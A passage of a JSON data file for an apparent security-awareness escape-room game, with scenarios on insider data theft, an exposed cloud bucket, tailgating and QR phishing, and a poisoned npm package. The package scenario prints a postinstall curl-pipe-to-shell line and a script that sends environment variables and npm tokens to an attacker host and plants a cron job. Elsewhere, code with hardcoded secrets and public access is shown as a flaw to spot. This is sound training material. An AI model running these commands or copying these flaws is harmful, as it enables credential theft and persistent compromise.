        "type": "code",
        "name": "The web log",
        "mask": "##:##",
        "answer": "2247",
        "task": "Here’s Vikram’s web and DLP log for 14 September. The pricing sheet was 2.4 MB. Enter the time it left the company.",
        "cols": [
          "Time",
          "Activity",
          "File (size)",
          "Result"
        ],
        "rows": [
          [
            "15:10",
            "Upload to sharepoint.lumenpay.com",
            "Merchant_Pricing_FY27.xlsx (2.4 MB)",
            "Allowed, approved site",
            "ok"
          ],
          [
            "17:30",
            "Email to a merchant contact",
            "Product_Brochure.pdf (1.1 MB)",
            "Allowed",
            "ok"
          ],
          [
            "21:58",
            "Copy to USB drive",
            "Export_Merchants.csv (6.8 MB)",
            "DLP alert, user overrode",
            "bad"
          ],
          [
            "22:47",
            "Upload to wetransfer.com",
            "holiday_photos.zip (2.4 MB)",
            "Allowed, no rule",
            "bad"
          ]
        ],
        "hint": "Files can be renamed. Sizes rarely change.",
        "debrief": "Renamed to holiday_photos.zip and sent at 10:47 PM. The USB copy that night took the merchant list too. A colleague had actually seen something that evening."
      },
      {
        "type": "choice",
        "name": "The colleague",
        "task": "The evening before his last day, Ananya saw Vikram copying folders to a pen drive. What should she have done?",
        "options": [
          {
            "id": "conf",
            "text": "Confront him at his desk.",
            "why": "It could be legitimate, it could tip him off, and it isn’t her job to investigate."
          },
          {
            "id": "ign",
            "text": "Ignore it. He’s leaving anyway.",
            "why": "That’s exactly when data walks out."
          },
          {
            "id": "rep",
            "text": "Quietly tell her manager or the security team that evening.",
            "right": true
          },
          {
            "id": "grp",
            "text": "Mention it in the team WhatsApp group.",
            "why": "That spreads rumour and alerts him, without reaching the people who can act."
          }
        ],
        "hint": "Who can actually check, and act, without making a scene?",
        "debrief": "Reporting isn’t accusing. Security can check quietly and the person may have a good reason. Ananya’s instinct was right; she just didn’t tell anyone."
      },
      {
        "type": "spot",
        "frame": "mail",
        "name": "The farewell email",
        "task": "Security finds Vikram’s farewell email to his team. Tap the 4 lines that show company data leaving with him.",
        "items": [
          {
            "id": "from",
            "head": "From",
            "html": "Vikram (Sales Manager)"
          },
          {
            "id": "to",
            "head": "To",
            "html": "Sales West team"
          },
          {
            "id": "subj",
            "head": "Subject",
            "html": "Signing off!"
          },
          {
            "id": "thanks",
            "html": "Thanks for four great years, team. I’ll miss our Friday chai."
          },
          {
            "id": "contacts",
            "html": "I’ve kept a copy of my merchant contact sheet so I can stay in touch with everyone.",
            "flag": true,
            "note": "Merchant contacts are company data, even if Vikram built the list."
          },
          {
            "id": "models",
            "html": "I’m taking my pricing models with me. I built them, after all.",
            "flag": true,
            "note": "Work done for the company belongs to the company. “I built it” doesn’t make it his."
          },
          {
            "id": "sent",
            "html": "I forwarded my Sent folder to my Gmail so I have a record of my deals.",
            "flag": true,
            "note": "Company email in a personal mailbox is out of Lumen Pay’s control."
          },
          {
            "id": "drive",
            "html": "I’ve also shared the proposal templates with my personal Drive, in case anyone needs them.",
            "flag": true,
            "note": "Sharing to personal storage is data leaving, whatever the reason."
          },
          {
            "id": "li",
            "html": "Let’s stay in touch on LinkedIn!"
          }
        ],
        "hint": "For each line, ask: does this take company information outside the company?",
        "debrief": "Client lists, pricing models, emails and templates made at work belong to the company. Taking them breaks policy, and Legal can act on it."
      },
      {
        "type": "pick",
        "name": "The leftovers",
        "task": "HR disabled Vikram’s network ID on his last day. Pick the 2 places where he still has access to company data.",
        "items": [
          {
            "id": "shared",
            "text": "The shared password for the merchant portal’s admin account, used by the whole sales team",
            "bad": true,
            "why": "Shared passwords don’t switch off with one person’s ID. Change them whenever someone who knew them leaves."
          },
          {
            "id": "badge",
            "text": "His building badge, deactivated on his last day",
            "why": "Already switched off."
          },
          {
            "id": "laptop",
            "text": "His laptop, returned to IT on his last day",
            "why": "IT has it."
          },
          {
            "id": "phone",
            "text": "Company files and emails already downloaded to his personal phone",
            "bad": true,
            "why": "Data stays on a personal phone unless IT can wipe the work profile."
          },
          {
            "id": "vpn",
            "text": "His VPN account, which uses his network ID",
            "why": "Disabling the network ID shut this too."
          },
          {
            "id": "sso",
            "text": "Single sign-on apps like the CRM, which use his network ID",
            "why": "With single sign-on, one switch closes them all."
          }
        ],
        "hint": "Look for access that doesn’t depend on his own network ID.",
        "debrief": "Shared passwords and personal phones survive offboarding. Change shared passwords whenever someone who knew them leaves, and keep work data in a work profile IT can wipe."
      },
      {
        "type": "order",
        "name": "The fix",
        "task": "Put the leaver process in order, from resignation to last day.",
        "steps": [
          {
            "id": "hr",
            "text": "HR tells IT and Security on the day someone resigns."
          },
          {
            "id": "cut",
            "text": "Reduce access for the notice period: no bulk exports, USB or personal cloud."
          },
          {
            "id": "mon",
            "text": "Security watches DLP alerts closely until the last day."
          },
          {
            "id": "off",
            "text": "On the last day: disable accounts, collect devices, remind them of the NDA."
          }
        ],
        "shown": [
          "off",
          "mon",
          "hr",
          "cut"
        ],
        "hint": "Nobody can reduce access they don’t know needs reducing.",
        "debrief": "Most insider data loss happens in the weeks around resignation. Joining up HR, IT and Security closes the gap."
      }
    ],
    "lessons": [
      "Resignation day is when access should shrink, not the last day.",
      "Renamed files still leave a trail. DLP overrides need review.",
      "Seeing something odd? Tell your manager or Security quietly. Reporting isn’t accusing.",
      "HR, IT and Security act together on every leaver.",
      "Work you create at your job belongs to the company. It stays when you leave.",
      "When someone leaves, change shared passwords and wipe work data from their phone."
    ],
    "decision": {
      "type": "decision",
      "name": "The next move",
      "prompt": "You now know the pricing sheet went to WeTransfer. Vikram has already left. What do you do first?",
      "options": [
        {
          "id": "sec",
          "text": "Tell Security and Legal, and keep his laptop and logs exactly as they are.",
          "q": "best",
          "note": "Evidence preserved, and the right people are acting."
        },
        {
          "id": "wa",
          "text": "Message Vikram on WhatsApp and ask him to delete it.",
          "q": "ok",
          "pen": 60,
          "note": "It tips him off and proves nothing. Leave contact to Legal. +60 seconds."
        },
        {
          "id": "wipe",
          "text": "Wipe his laptop and give it to the next joiner.",
          "q": "poor",
          "note": "The laptop held the evidence. Now you need other sources."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "Find the evidence",
      "task": "IT wiped the laptop yesterday. Pick the 2 places where evidence still exists.",
      "items": [
        {
          "id": "proxy",
          "text": "Web proxy and DLP logs on the security servers",
          "bad": true
        },
        {
          "id": "bin",
          "text": "The recycle bin on the wiped laptop",
          "why": "A wipe clears that too."
        },
        {
          "id": "mail",
          "text": "Email and cloud audit logs kept by IT",
          "bad": true
        },
        {
          "id": "desk",
          "text": "His old desk drawer"
        }
      ],
      "hint": "Think about what is recorded centrally, not on the device.",
      "debrief": "The central logs saved the case. Always preserve a leaver’s device until Security clears it."
    },
    "track": "core"
  },
  {
    "id": "cloud",
    "title": "The Open Bucket",
    "company": "Corvid Pay",
    "threat": "Cloud misconfiguration, secrets in code",
    "lede": "Wednesday, 8:10 AM. A security researcher emails: “Your UPI transaction logs are readable by anyone on the internet.” She’s right.",
    "locks": [
      {
        "type": "choice",
        "name": "The researcher’s email",
        "task": "8:10 AM. A security researcher emails the support inbox: Corvid’s UPI logs are open to the internet, and she’s attached two sample files as proof. What do you do?",
        "options": [
          {
            "id": "ignore",
            "text": "Ignore it. It’s probably someone fishing for a reward.",
            "why": "People who report problems are doing you a favour. Ignored reports often end up public."
          },
          {
            "id": "fwd",
            "text": "Forward it to the security team now, and reply to thank her and say Security will be in touch.",
            "right": true,
            "why": "Fast escalation, and a researcher who keeps working with you."
          },
          {
            "id": "legal",
            "text": "Reply that accessing your systems is illegal and you’ll take legal action.",
            "why": "Threats stop people reporting. The data stays exposed."
          },
          {
            "id": "open",
            "text": "Open the sample files yourself to check she’s right before telling anyone.",
            "why": "Attachments from strangers are a risk, and checking first wastes time. Let Security verify."
          }
        ],
        "hint": "The right answer gets the experts involved fast and keeps her on your side.",
        "debrief": "Security confirmed it within minutes: the logs really are public. Now work out how the code made that happen."
      },
      {
        "type": "spot",
        "frame": "code",
        "name": "The code",
        "fileName": "txn_logger.py",
        "task": "This code went live last week. Tap the 4 security problems.",
        "items": [
          {
            "id": "imp",
            "html": "import boto3"
          },
          {
            "id": "key",
            "html": "AWS_KEY = \"AKIA4XR7••••Q2LM\"  # TODO remove",
            "flag": true,
            "note": "A cloud key written into code. Anyone who sees the repo gets access."
          },
          {
            "id": "pw",
            "html": "DB_PASSWORD = \"Corvid@123\"",
            "flag": true,
            "note": "A weak password, hardcoded. Secrets belong in a secrets manager."
          },
          {
            "id": "cli",
            "html": "s3 = boto3.client(\"s3\", region_name=\"ap-south-1\")"
          },
          {
            "id": "def",
            "html": "def save_txn(t):"
          },
          {
            "id": "rec",
            "html": "    rec = f\"{t.time},{t.payer_vpa},{t.mobile},{t.amount}\"",
            "flag": true,
            "note": "Full UPI IDs and mobile numbers logged in plain text. Mask personal data in logs."
          },
          {
            "id": "put",
            "html": "    s3.put_object(Bucket=\"corvid-txn-logs\", Key=t.id, Body=rec,"
          },
          {
            "id": "acl",
            "html": "                  ACL=\"public-read\")",
            "flag": true,
            "note": "“public-read” makes every log file readable by anyone with the address."
          },
          {
            "id": "ret",
            "html": "    return True"
          }
        ],
        "hint": "Look for secrets, personal data, and who is allowed to read the files.",
        "debrief": "The code wrote each log as public. But the bucket itself was also opened up. When did that happen?"
      },
      {
        "type": "code",
        "name": "The cloud trail",
        "mask": "##:##",
        "answer": "1638",
        "task": "Here’s the cloud audit trail for the bucket on Tuesday. Enter the time the whole bucket became public.",
        "cols": [
          "Time",
          "Who",
          "Action",
          "Detail"
        ],
        "rows": [
          [
            "10:02",
            "deploy-pipeline",
            "CreateBucket",
            "corvid-txn-logs",
            "ok"
          ],
          [
            "10:05",
            "deploy-pipeline",
            "PutBucketPolicy",
            "Access: Corvid app role only",
            "ok"
          ],
          [
            "16:38",
            "dev-intern-key",
            "PutBucketPolicy",
            "Access: Principal \"*\" (everyone)",
            "bad"
          ],
          [
            "16:40",
            "dev-intern-key",
            "PutPublicAccessBlock",
            "Block public access: OFF",
            "bad"
          ],
          [
            "Wed 03:12",
            "anonymous",
            "ListBucket, GetObject ×1,842",
            "IP from outside India",
            "bad"
          ]
        ],
        "hint": "“*” means everyone. The block switch went off after the policy changed.",
        "debrief": "A developer opened the bucket “just to test” at 4:38 PM and forgot. Overnight, someone listed it and downloaded 1,842 files. Time to close it properly."
      },
      {
        "type": "pick",
        "name": "The fix",
        "task": "Pick the 3 actions that actually close the hole.",
        "items": [
          {
            "id": "bpa",
            "text": "Turn Block Public Access back on, for the account as well as the bucket.",
            "bad": true
          },
          {
            "id": "rename",
            "text": "Rename the bucket so it’s harder to guess.",
            "why": "Renaming hides nothing that’s already public or listed."
          },
          {
            "id": "rot",
            "text": "Revoke the leaked key and issue a new one.",
            "bad": true
          },
          {
            "id": "del",
            "text": "Delete the commit that contains the key.",
            "why": "Git history and copies keep it. Treat a leaked key as compromised."
          },
          {
            "id": "vault",
            "text": "Move all secrets out of code into a secrets manager.",
            "bad": true
          },
          {
            "id": "quiet",
            "text": "Ask the researcher to keep it quiet.",
            "why": "Thank her and work with her. Silence isn’t a fix."
          }
        ],
        "hint": "Hiding a problem is not the same as fixing it.",
        "debrief": "Public access blocked, key revoked, secrets moved. Now handle the incident itself."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "Put the incident steps in order.",
        "steps": [
          {
            "id": "rep",
            "text": "Report it to the security team and thank the researcher."
          },
          {
            "id": "block",
            "text": "Block public access to the bucket."
          },
          {
            "id": "key",
            "text": "Revoke and rotate the leaked key."
          },
          {
            "id": "logs",
            "text": "Review access logs to find exactly what was downloaded."
          }
        ],
        "shown": [
          "logs",
          "key",
          "rep",
          "block"
        ],
        "hint": "Security leads, then close the door anyone on the internet can use, then the key only one attacker might hold.",
        "debrief": "Security then handles notifications in parallel: CERT-In expects incidents reported within 6 hours, and bank clients have their own contractual timelines."
      },
      {
        "type": "choice",
        "name": "The test data",
        "task": "The root cause: the developer wanted “realistic data” to test the new logging. What should they have used?",
        "options": [
          {
            "id": "copy",
            "text": "A copy of last month’s production logs, deleted after testing.",
            "why": "Real customer data in a test system is a breach waiting to happen, however briefly."
          },
          {
            "id": "synth",
            "text": "Masked or synthetic data that looks real but identifies no one.",
            "right": true,
            "why": "Tests work just as well, and a leak exposes no one."
          },
          {
            "id": "priv",
            "text": "Production data, as long as the test bucket is private.",
            "why": "Test setups change often and get opened “just to test”, exactly as happened here."
          },
          {
            "id": "staff",
            "text": "Real data from colleagues who agree to share it.",
            "why": "It’s still real personal data, now in a less protected place."
          }
        ],
        "hint": "If this test data leaked, who would be harmed?",
        "debrief": "Masked or synthetic data keeps tests realistic without putting real people at risk. Production data stays in production."
      }
    ],
    "lessons": [
      "Never put keys or passwords in code.",
      "“Public” in the cloud means anyone on earth. Testing shortcuts get forgotten.",
      "A leaked key is compromised forever. Revoke it; don’t just delete the commit.",
      "Report cloud exposures to Security at once. The 6-hour CERT-In clock starts early.",
      "Thank people who report problems, and pass their reports to Security at once.",
      "Test with masked or synthetic data, never real customer data."
    ],
    "decision": {
      "type": "decision",
      "name": "The quick fix",
      "prompt": "It’s 8:40 AM and the bucket is still public. Your manager says: “Just delete the whole bucket.” What do you do?",
      "options": [
        {
          "id": "block",
          "text": "Block public access now, and keep the bucket and its logs for the investigation.",
          "q": "best",
          "note": "Exposure closed, evidence kept."
        },
        {
          "id": "later",
          "text": "Make it private, then tell Security after the morning stand-up.",
          "q": "ok",
          "pen": 60,
          "note": "Security needed to know at once: the notification clock is already running. +60 seconds."
        },
        {
          "id": "del",
          "text": "Delete the bucket and its logs so the problem disappears.",
          "q": "poor",
          "note": "The access logs went with it. Now you have to find out what leaked another way."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "Rebuild the picture",
      "task": "Deleting the bucket also deleted its logs. Pick the 2 sources that can still show who downloaded data.",
      "items": [
        {
          "id": "trail",
          "text": "The cloud audit trail, if data-access logging was switched on",
          "bad": true
        },
        {
          "id": "hist",
          "text": "The developer’s browser history"
        },
        {
          "id": "access",
          "text": "Server access logs delivered to a separate logging bucket",
          "bad": true
        },
        {
          "id": "sig",
          "text": "The researcher’s email signature"
        }
      ],
      "hint": "Logs that were stored somewhere else survive a deletion.",
      "debrief": "Logs kept outside the bucket survived. Keep logs separate from the data they describe."
    },
    "track": "core"
  },
  {
    "id": "visitor",
    "title": "The Visitor",
    "company": "Helix Pay",
    "threat": "Tailgating, QR phishing, physical security",
    "lede": "Friday, 9:20 AM. IT finds a small unknown device plugged into a network port behind the 3rd-floor printer. Nobody knows how it got there.",
    "locks": [
      {
        "type": "choice",
        "name": "The phone call",
        "task": "Wednesday, 4 PM. Reception gets a call: “Hi, CoolAir here. Your facilities manager booked an AC service on floor 3 tomorrow at 2. Please add our technician to the visitor list.” What should reception do?",
        "options": [
          {
            "id": "add",
            "text": "Add him. The caller knew the manager’s name and the floor.",
            "why": "Names and floors are easy to find online. Knowing them proves nothing."
          },
          {
            "id": "cb",
            "text": "Ask for the caller’s number and call back to confirm.",
            "why": "A number the caller gives you leads straight back to the caller."
          },
          {
            "id": "dir",
            "text": "Check with the facilities manager, using the internal directory, before adding anyone.",
            "right": true,
            "why": "Confirm through a channel you already trust, not one the caller gives you."
          },
          {
            "id": "mail",
            "text": "Ask CoolAir to email the work order.",
            "why": "An email is as easy to fake as a phone call."
          }
        ],
        "hint": "Which check uses information the caller doesn’t control?",
        "debrief": "Reception added him without checking. On Thursday afternoon, a man in a CoolAir uniform walked in. Here’s what CCTV saw."
      },
      {
        "type": "pick",
        "name": "The CCTV",
        "task": "CCTV from Thursday afternoon shows these moments. Pick the 3 that let a stranger in and around.",
        "items": [
          {
            "id": "door",
            "text": "Priya held the badge door open for a man in an AC-technician uniform carrying boxes.",
            "bad": true
          },
          {
            "id": "reg",
            "text": "The visitor signed the register at reception."
          },
          {
            "id": "walk",
            "text": "He walked around floor 3 alone for 25 minutes. Nobody escorted him.",
            "bad": true
          },
          {
            "id": "ask",
            "text": "A colleague asked which team he was there to see."
          },
          {
            "id": "chair",
            "text": "The printer room door was propped open with a chair.",
            "bad": true
          },
          {
            "id": "lock",
            "text": "Staff locked their screens when they left their desks."
          }
        ],
        "hint": "Which moments removed a barrier the office already had?",
        "debrief": "He got in, wandered, and found an open room. Before leaving, he also stuck posters in the pantry. Here’s one."
      },
      {
        "type": "spot",
        "frame": "note",
        "name": "The poster",
        "task": "Staff found this poster in the pantry. Tap the 4 warning signs.",
        "items": [
          {
            "id": "hd",
            "html": "<b>HR Benefits Team</b>"
          },
          {
            "id": "gift",
            "html": "Festive bonus: a ₹2,000 meal voucher for every Helix employee!"
          },
          {
            "id": "creds",
            "html": "Scan the QR code and sign in with your Helix email and password to claim.",
            "flag": true,
            "note": "A voucher never needs your work password."
          },
          {
            "id": "time",
            "html": "Offer ends at 5 PM today.",
            "flag": true,
            "note": "False urgency again."
          },
          {
            "id": "url",
            "html": "<span class=\"qrmini\" aria-hidden=\"true\"></span> QR opens: helixpay-rewards.co/sso",
            "flag": true,
            "note": "Lookalike address. QR codes hide links, so check the preview before opening."
          },
          {
            "id": "tape",
            "html": "<i>The poster is taped over the official canteen notice.</i>",
            "flag": true,
            "note": "Stickers or posters covering official ones are a classic QR-phishing trick."
          },
          {
            "id": "fest",
            "html": "Happy festive season from all of us!"
          }
        ],
        "hint": "What does the QR ask for, where does it go, how fast, and where was the poster put?",
        "debrief": "Six people scanned it before lunch, and two typed in their Helix email and password."
      },
      {
        "type": "code",
        "name": "The door log",
        "mask": "##:##",
        "answer": "1441",
        "task": "Here’s Thursday’s door log. Enter the time the stranger got into the printer room.",
        "cols": [
          "Time",
          "Door",
          "Event"
        ],
        "rows": [
          [
            "14:27",
            "Main entrance",
            "Badge 1043 (Priya) granted",
            "ok"
          ],
          [
            "14:27",
            "Main entrance",
            "Door held open 9 seconds: tailgate alert",
            "bad"
          ],
          [
            "14:35",
            "Floor 3 lobby",
            "Visitor badge V-17 granted",
            "ok"
          ],
          [
            "14:38",
            "Printer room",
            "Visitor badge V-17 denied",
            "bad"
          ],
          [
            "14:41",
            "Printer room",
            "Door open, no badge: sensor alarm ignored",
            "bad"
          ],
          [
            "14:58",
            "Main entrance",
            "Visitor badge V-17 exit",
            "ok"
          ]
        ],
        "hint": "Being denied doesn’t mean being stopped.",
        "debrief": "Denied at 2:38 PM, he walked through the propped door at 2:41 PM and plugged in the device. It sat on the network overnight. And the device wasn’t the only thing he could walk away with."
      },
      {
        "type": "pick",
        "name": "The walk-through",
        "task": "On floor 3 he walked past these desks alone. Pick the 3 things he could have photographed or taken.",
        "items": [
          {
            "id": "note",
            "text": "A sticky note with the Wi-Fi password on a monitor",
            "bad": true,
            "why": "A password on a sticky note is free for anyone walking past."
          },
          {
            "id": "locked",
            "text": "A laptop with its screen locked and a privacy filter on",
            "why": "Locked and filtered: nothing to see."
          },
          {
            "id": "print",
            "text": "A printed merchant settlement report left in the printer tray",
            "bad": true,
            "why": "Printouts walk out of the building easily. Collect them straight away."
          },
          {
            "id": "drawer",
            "text": "Notebooks in a locked desk drawer",
            "why": "Locked away."
          },
          {
            "id": "board",
            "text": "A whiteboard listing the network team’s server names and admin usernames",
            "bad": true,
            "why": "Server names and usernames are half an attacker’s map. Wipe whiteboards after meetings."
          },
          {
            "id": "photo",
            "text": "A team photo pinned to the desk partition",
            "why": "Harmless."
          }
        ],
        "hint": "Look for information he didn’t need a password to see.",
        "debrief": "Doors are only one layer. A clear desk and a locked screen leave a visitor nothing to collect."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "You find an unknown device plugged in at work. Put the steps in order.",
        "steps": [
          {
            "id": "leave",
            "text": "Leave it where it is. Don’t unplug it or plug it into anything else."
          },
          {
            "id": "call",
            "text": "Call Security right away."
          },
          {
            "id": "iso",
            "text": "Security disables the network port and keeps the device as evidence."
          },
          {
            "id": "rules",
            "text": "Tighten the rules: escort visitors, close doors, don’t hold them for people without a badge."
          }
        ],
        "shown": [
          "iso",
          "rules",
          "call",
          "leave"
        ],
        "hint": "Your first move is not touching anything.",
        "debrief": "Physical access beats every firewall. Challenging politely and escorting visitors are security controls, not rudeness."
      }
    ],
    "lessons": [
      "Holding the door is kind, but not for someone without a badge.",
      "Visitors are escorted, always. Doors stay shut.",
      "QR codes hide links. Never sign in from a poster.",
      "Unknown device? Don’t touch it. Call Security.",
      "Check unexpected visit requests with a person or number you already know.",
      "Clear your desk and lock your screen whenever you step away."
    ],
    "decision": {
      "type": "decision",
      "name": "The signed-in staff",
      "prompt": "Two staff typed their Helix passwords into the poster’s page. What happens now?",
      "options": [
        {
          "id": "reset",
          "text": "They report it and reset their passwords now, and Security checks their sign-ins.",
          "q": "best",
          "note": "Fast reset plus a sign-in check closes the gap."
        },
        {
          "id": "next",
          "text": "Ask them to change their passwords next time they log in.",
          "q": "ok",
          "pen": 60,
          "note": "Hours of exposure for no reason. Reset immediately. +60 seconds."
        },
        {
          "id": "tear",
          "text": "Tear the poster down and say nothing.",
          "q": "poor",
          "note": "The stolen passwords still work. Someone is about to use one."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "The overseas sign-in",
      "task": "Next morning one of those accounts shows a sign-in from overseas. Pick the 2 actions to take now.",
      "items": [
        {
          "id": "out",
          "text": "Sign the account out everywhere and reset the password",
          "bad": true
        },
        {
          "id": "wait",
          "text": "Wait for a second sign-in to be sure",
          "why": "One is enough. Act now."
        },
        {
          "id": "mfa",
          "text": "Check for a new MFA device the attacker may have added",
          "bad": true
        },
        {
          "id": "del",
          "text": "Delete the account’s emails so nothing can be read"
        }
      ],
      "hint": "Remove the attacker’s access, and the way they could get it back.",
      "debrief": "Access cut and the rogue MFA device removed. A poster cost an account takeover."
    },
    "track": "core"
  },
  {
    "id": "pkg",
    "track": "dev",
    "title": "The Poisoned Package",
    "company": "Tessera Pay",
    "threat": "Supply-chain attack, typosquatting, CI secrets",
    "lede": "Thursday, 9:05 AM. Monitoring shows the settlement build server sent data to an unknown website at 2 AM. Nobody changed the code. So what ran?",
    "locks": [
      {
        "type": "spot",
        "frame": "code",
        "name": "The manifest",
        "fileName": "package.json",
        "task": "Here’s the project’s package.json from last night’s build. Tap the 4 lines that let an attacker in.",
        "items": [
          {
            "id": "name",
            "html": "\"name\": \"tessera-settlement-api\","
          },
          {
            "id": "start",
            "html": "\"start\": \"node server.js\","
          },
          {
            "id": "post",
            "html": "\"postinstall\": \"curl -s http://45.83.12.7/i.sh | sh\",",
            "flag": true,
            "note": "An install script that downloads and runs code from a bare IP address. It runs on every machine that installs the project."
          },
          {
            "id": "express",
            "html": "\"express\": \"^4.19.2\","
          },
          {
            "id": "axois",
            "html": "\"axois\": \"^1.7.2\",",
            "flag": true,
            "note": "Typosquat. The real library is axios. Attackers publish lookalike names and wait for a typo."
          },
          {
            "id": "git",
            "html": "\"upi-helper\": \"github:free-dev-tools/upi-helper\",",
            "flag": true,
            "note": "Code pulled straight from an unknown person’s GitHub account, not from your approved registry."
          },
          {
            "id": "latest",
            "html": "\"date-fns\": \"latest\",",
            "flag": true,
            "note": "“latest” installs whatever was published most recently, including a hijacked release. Pin exact versions and use a lockfile."
          },
          {
            "id": "lodash",
            "html": "\"lodash\": \"4.17.21\""
          }
        ],
        "hint": "Look for misspelled names, code from unusual places, versions that aren’t pinned, and scripts that run on install.",
        "debrief": "The typosquatted package ran its own install script inside the build. But what did it take, and when?"
      },
      {
        "type": "code",
        "name": "The build log",
        "mask": "##:##:##",
        "answer": "021034",
        "task": "Here’s the CI log for build #4182. Enter the exact time (HH:MM:SS) the build’s secrets left the server.",
        "cols": [
          "Time",
          "Step",
          "Detail"
        ],
        "rows": [
          [
            "02:10:04",
            "Pipeline started",
            "Branch main, build #4182",
            "ok"
          ],
          [
            "02:10:31",
            "npm install",
            "412 packages installed",
            "ok"
          ],
          [
            "02:10:33",
            "axois@1.7.2 postinstall",
            "Read 14 environment variables",
            "bad"
          ],
          [
            "02:10:34",
            "Outbound HTTPS",
            "POST to paste-cdn.xyz, 3.1 KB",
            "bad"
          ],
          [
            "02:11:20",
            "Tests",
            "218 passed",
            "ok"
          ],
          [
            "02:12:02",
            "Deploy",
            "Staging updated",
            "ok"
          ]
        ],
        "hint": "Reading the secrets isn’t the same as sending them. Look for data leaving the server.",
        "debrief": "At 2:10:34 AM the package posted the build’s environment variables, including deploy keys, to the attacker. Tests passed and the deploy looked normal."
      },
      {
        "type": "spot",
        "frame": "code",
        "name": "The script",
        "fileName": "i.sh · downloaded by the postinstall line",
        "task": "Here’s i.sh, the script the postinstall line downloaded and ran. Tap the 4 lines that do damage.",
        "items": [
          {
            "id": "sh",
            "html": "#!/bin/sh"
          },
          {
            "id": "echo",
            "html": "echo &quot;Setting up upi-helper...&quot;"
          },
          {
            "id": "env",
            "html": "env | base64 | curl -s -X POST --data-binary @- https://upi-helper.top/c",
            "flag": true,
            "note": "Sends every environment variable, secrets included, to the attacker."
          },
          {
            "id": "npmrc",
            "html": "cat ~/.npmrc 2&gt;/dev/null | curl -s -X POST --data-binary @- https://upi-helper.top/n",
            "flag": true,
            "note": "Steals the npm token, so the attacker can publish packages as your company."
          },
          {
            "id": "mk",
            "html": "mkdir -p ~/.cache/upi"
          },
          {
            "id": "cron",
            "html": "(crontab -l 2&gt;/dev/null; echo &quot;*/30 * * * * curl -s https://upi-helper.top/b | sh&quot;) | crontab -",
            "flag": true,
            "note": "Persistence: a job that re-runs the attacker’s code every 30 minutes."
          },
          {
            "id": "rm",
            "html": "rm -f &quot;$0&quot;",
            "flag": true,
            "note": "Deletes itself to hide the evidence."
          }
        ],
        "hint": "Look for lines that send data out, bring the attacker back later, or cover tracks.",
        "debrief": "The script stole the build’s secrets and the npm token, planted a job to come back every 30 minutes, then deleted itself. Deleting the package isn’t enough: rebuild the server from clean."
      },
      {
        "type": "pick",
        "name": "The keys",
        "task": "The build could read these. Pick the 3 that must be rotated now.",
        "items": [
          {
            "id": "aws",
            "text": "The cloud deploy key used to release to production",
            "bad": true
          },
          {
            "id": "cdn",
            "text": "The public address of your website",
            "why": "Already public. Nothing to rotate."
          },
          {
            "id": "npm",
            "text": "The token that publishes your company’s own packages",
            "bad": true,
            "why": "With it, attackers can poison your packages for everyone who uses them."
          },
          {
            "id": "lic",
            "text": "The open-source licence file"
          },
          {
            "id": "db",
            "text": "The staging database password",
            "bad": true
          },
          {
            "id": "chan",
            "text": "The name of the team’s chat channel"
          }
        ],
        "hint": "Anything secret that the build could read counts as stolen.",
        "debrief": "If a secret was in the build’s environment, assume the attacker has it. Rotate first, investigate in parallel."
      },
      {
        "type": "order",
        "name": "The response",
        "task": "Put the response in order.",
        "steps": [
          {
            "id": "stop",
            "text": "Stop the pipeline and block traffic to the attacker’s domain."
          },
          {
            "id": "rot",
            "text": "Rotate every secret the build could read."
          },
          {
            "id": "clean",
            "text": "Remove the package, pin versions and rebuild from a clean lockfile."
          },
          {
            "id": "prev",
            "text": "Prevent a repeat: an approved package registry, dependency scanning, and install scripts switched off in CI."
          }
        ],
        "shown": [
          "clean",
          "prev",
          "stop",
          "rot"
        ],
        "hint": "Contain, then make stolen secrets useless, then clean up, then prevent.",
        "debrief": "Supply-chain attacks hit everyone who trusts the package. Approved registries and pinned versions are the guard rails."
      },
      {
        "type": "choice",
        "name": "The safe install",
        "task": "You’re rebuilding the pipeline. Which install setup should CI use from now on?",
        "options": [
          {
            "id": "latest",
            "text": "<code>npm install</code> on every build, so you always get the latest fixes.",
            "why": "“Latest” is exactly how a poisoned version slips in unnoticed."
          },
          {
            "id": "ci",
            "text": "<code>npm ci --ignore-scripts</code> with the committed lockfile, pulling only from the company’s approved registry.",
            "right": true,
            "why": "Exact reviewed versions, no install scripts, and a registry that scans packages first."
          },
          {
            "id": "force",
            "text": "<code>npm install --force</code>, then run <code>npm audit</code> after deploying.",
            "why": "Forcing hides warnings, and an audit after deploying is too late."
          },
          {
            "id": "top",
            "text": "Pin the top-level packages in package.json and skip the lockfile.",
            "why": "Without a lockfile, every sub-dependency can still change under you."
          }
        ],
        "hint": "You want the exact versions you reviewed, no surprise scripts, and a trusted source.",
        "debrief": "A lockfile, disabled install scripts and an approved registry turn a supply-chain attack into a failed build instead of a breach."
      }
    ],
    "lessons": [
      "Check package names letter by letter. Typosquats live one typo away.",
      "Pin versions, commit the lockfile, and switch off install scripts in CI.",
      "Treat every secret the build could see as stolen. Rotate first.",
      "Use an approved package registry with scanning, not whatever is on the internet.",
      "A malicious install script steals secrets, comes back and hides. Rebuild from clean; don’t just delete the package."
    ],
    "decision": {
      "type": "decision",
      "name": "The release",
      "prompt": "It’s 9:30 AM. You’ve found the bad package, and the production release is due at 11. What do you do?",
      "options": [
        {
          "id": "stop",
          "text": "Stop the release, tell Security, and treat every secret in the build as stolen.",
          "q": "best",
          "note": "Right call. The secrets are compromised whether or not the release goes out."
        },
        {
          "id": "ship",
          "text": "Remove the package, ship at 11, and rotate secrets next sprint.",
          "q": "ok",
          "pen": 60,
          "note": "Stolen secrets keep working until they’re rotated. That’s days of open access. +60 seconds."
        },
        {
          "id": "ignore",
          "text": "It only ran in staging. Ship as planned.",
          "q": "poor",
          "note": "The same pipeline holds the production deploy key. Now check what the attacker did with it."
        }
      ]
    },
    "detour": {
      "type": "pick",
      "name": "Production check",
      "task": "The production deploy key was in that build. Pick the 2 signs that the attacker used it.",
      "items": [
        {
          "id": "iam",
          "text": "A new cloud admin user created at 3:12 AM",
          "bad": true,
          "why": "Attackers create their own accounts so they can come back."
        },
        {
          "id": "bak",
          "text": "The scheduled database backup at 1:00 AM"
        },
        {
          "id": "ip",
          "text": "API calls from an IP address in a country you don’t operate in",
          "bad": true
        },
        {
          "id": "dev",
          "text": "A developer signing in from the Pune office at 9 AM"
        }
      ],
      "hint": "Look for activity that nobody scheduled and nobody on the team did.",
